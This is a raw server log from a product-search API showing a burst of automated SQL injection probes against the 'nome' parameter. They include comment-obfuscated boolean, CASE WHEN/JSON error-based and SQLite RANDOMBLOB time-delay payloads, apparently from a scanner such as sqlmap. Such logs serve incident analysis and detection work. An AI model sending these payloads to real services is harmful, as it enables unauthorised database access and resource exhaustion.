api-1  | Servidor rodando em http://0.0.0.0:8000
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F5883%3D4358--%2F%2A%2A%2FodAA&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F7009%3D7009--%2F%2A%2A%2FtJNs&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%285416%3D8897%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%28116%2C101%2C115%2C116%2C101%29%2F%2A%2A%2FELSE%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F8897%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F8124%29%2F%2A%2A%2FEND%29%29&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%283252%3D3252%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%28116%2C101%2C115%2C116%2C101%29%2F%2A%2A%2FELSE%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F2404%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F4520%29%2F%2A%2A%2FEND%29%29&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=%28SELECT%2F%2A%2A%2FCONCAT%28CONCAT%28CHAR%28113%2C120%2C107%2C118%2C113%29%2C%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%284731%3D4731%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2CCHAR%28113%2C107%2C118%2C107%2C113%29%29%29&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2FCASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F1310%3D6756%2F%2A%2A%2FTHEN%2F%2A%2A%2F1310%2F%2A%2A%2FELSE%2F%2A%2A%2FJSON%28CHAR%2879%2C84%2C75%2C107%29%29%2F%2A%2A%2FEND--%2F%2A%2A%2Fvkrz&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2FCASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F9424%3D9424%2F%2A%2A%2FTHEN%2F%2A%2A%2F9424%2F%2A%2A%2FELSE%2F%2A%2A%2FJSON%28CHAR%2890%2C105%2C99%2C104%29%29%2F%2A%2A%2FEND--%2F%2A%2A%2FIZDh&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2FCASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F5168%3D2945%2F%2A%2A%2FTHEN%2F%2A%2A%2F5168%2F%2A%2A%2FELSE%2F%2A%2A%2FJSON%28CHAR%28109%2C68%2C72%2C100%29%29%2F%2A%2A%2FEND--%2F%2A%2A%2FzTCs&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2FCASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F9424%3D9424%2F%2A%2A%2FTHEN%2F%2A%2A%2F9424%2F%2A%2A%2FELSE%2F%2A%2A%2FJSON%28CHAR%2890%2C105%2C99%2C104%29%29%2F%2A%2A%2FEND--%2F%2A%2A%2FKKMN&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2FCASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F7954%3D6271%2F%2A%2A%2FTHEN%2F%2A%2A%2F7954%2F%2A%2A%2FELSE%2F%2A%2A%2FJSON%28CHAR%2865%2C86%2C66%2C108%29%29%2F%2A%2A%2FEND--%2F%2A%2A%2FefQF&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=SELECT%2F%2A%2A%2FCHAR%28113%2C120%2C107%2C118%2C113%29%7C%7C%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%288747%3D8747%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%7C%7CCHAR%28113%2C107%2C118%2C107%2C113%29&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=SQLite&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%3BSELECT%2F%2A%2A%2FLIKE%28CHAR%2865%2C66%2C67%2C68%2C69%2C70%2C71%29%2CUPPER%28HEX%28RANDOMBLOB%28500000000%2F2%29%29%29%29--&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%3BSELECT%2F%2A%2A%2FLIKE%28CHAR%2865%2C66%2C67%2C68%2C69%2C70%2C71%29%2CUPPER%28HEX%28RANDOMBLOB%28500000000%2F2%29%29%29%29--%2F%2A%2A%2Fttdv&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F9523%3DLIKE%28CHAR%2865%2C66%2C67%2C68%2C69%2C70%2C71%29%2CUPPER%28HEX%28RANDOMBLOB%28500000000%2F2%29%29%29%29--%2F%2A%2A%2FVBCN&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FOR%2F%2A%2A%2F8201%3DLIKE%28CHAR%2865%2C66%2C67%2C68%2C69%2C70%2C71%29%2CUPPER%28HEX%28RANDOMBLOB%28500000000%2F2%29%29%29%29--%2F%2A%2A%2Ftpbk&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F4397%3DLIKE%28CHAR%2865%2C66%2C67%2C68%2C69%2C70%2C71%29%2CUPPER%28HEX%28RANDOMBLOB%28500000000%2F2%29%29%29%29--&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FOR%2F%2A%2A%2F5051%3DLIKE%28CHAR%2865%2C66%2C67%2C68%2C69%2C70%2C71%29%2CUPPER%28HEX%28RANDOMBLOB%28500000000%2F2%29%29%29%29--&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2FCASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F20%3D20%2F%2A%2A%2FTHEN%2F%2A%2A%2F1289%2F%2A%2A%2FELSE%2F%2A%2A%2FJSON%28CHAR%28107%2C67%2C112%2C119%29%29%2F%2A%2A%2FEND--%2F%2A%2A%2FuatS&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2FCASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F20%3D40%2F%2A%2A%2FTHEN%2F%2A%2A%2F3725%2F%2A%2A%2FELSE%2F%2A%2A%2FJSON%28CHAR%28115%2C118%2C99%2C75%29%29%2F%2A%2A%2FEND--%2F%2A%2A%2FIjil&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2FCASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F40%3D29%2F%2A%2A%2FTHEN%2F%2A%2A%2F8960%2F%2A%2A%2FELSE%2F%2A%2A%2FJSON%28CHAR%28107%2C87%2C81%2C69%29%29%2F%2A%2A%2FEND--%2F%2A%2A%2FNaah&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2FCASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F29%3D29%2F%2A%2A%2FTHEN%2F%2A%2A%2F8235%2F%2A%2A%2FELSE%2F%2A%2A%2FJSON%28CHAR%28119%2C107%2C78%2C99%29%29%2F%2A%2A%2FEND--%2F%2A%2A%2FTgCi&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2FCASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F40%2F%2A%2A%2F29%2F%2A%2A%2FTHEN%2F%2A%2A%2F5976%2F%2A%2A%2FELSE%2F%2A%2A%2FJSON%28CHAR%28111%2C71%2C120%2C109%29%29%2F%2A%2A%2FEND--%2F%2A%2A%2FrMRL&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2FCASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F6910%3D%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F6910%2F%2A%2A%2FTHEN%2F%2A%2A%2F5642%2F%2A%2A%2FELSE%2F%2A%2A%2FJSON%28CHAR%28121%2C89%2C74%2C69%29%29%2F%2A%2A%2FEND--%2F%2A%2A%2FHioV&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2FCASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%289021%29%3D9021%2F%2A%2A%2FTHEN%2F%2A%2A%2F5601%2F%2A%2A%2FELSE%2F%2A%2A%2FJSON%28CHAR%28102%2C110%2C80%2C76%29%29%2F%2A%2A%2FEND--%2F%2A%2A%2FEMqj&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2FCASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F9022%3E9021%2F%2A%2A%2FTHEN%2F%2A%2A%2F3960%2F%2A%2A%2FELSE%2F%2A%2A%2FJSON%28CHAR%2897%2C113%2C80%2C85%29%29%2F%2A%2A%2FEND--%2F%2A%2A%2FlqJe&categoria=eletronicos HTTP/1.1
